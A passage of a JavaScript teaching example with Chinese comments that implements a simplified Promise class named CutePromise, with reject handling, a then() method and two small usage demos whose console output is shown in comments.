    self.resolveTask.forEach(resolved => resolved(self.value));
  }

  // 定义reject函数
  function reject (reason) {
    // 如果不是 pending 状态，直接返回（已经resolved的promise不能再被then了，但链式可以）
    if (self.status !== 'pending') {
      return;
    }
    self.reason = reason;
    self.status = 'rejected';
    self.rejectTask.forEach(rejected => rejected(self.reason));
  }

  // 传递resolve和reject函数给executor并执行
  exector(resolve, reject);
}

CutePromise.prototype.then = function (onResolved, onRejected) {
  // 参数的规范化处理，若 onResolved 和 onRejected 不是函数，用一个透传函数封装
  if (typeof onResolved !== 'function') onResolved = function (x) { return x };
  if (typeof onRejected !== 'function') onRejected = function (e) { throw e };

  // 保存this
  var self = this;
  // 根据状态执行相应的函数
  if (self.status === 'resolved') {
    onResolved(self.value);
  } else if (self.status === 'rejected') {
    onRejected(self.reason);
  } else if (self.status === 'pending') {
    self.resolveTask.push(onResolved);
    self.rejectTask.push(onRejected);
  }

  return self;
}

const a = new CutePromise(function(resolve, reject){
  // setTimeout(() => {
    resolve('成了！');
  // }, 1000);
}).then(function(value){
  console.log(value);
}, function(reason){
  console.log(reason);
}).then(() =>{
  console.log('任务2')
});

// 输出 “成了！”

new CutePromise(function(resolve, reject){
  reject('错了！');
}).then(function(value){
  console.log(value);
}, (reason) => {
  console.log(reason);
})

// 输出“错了！”
```

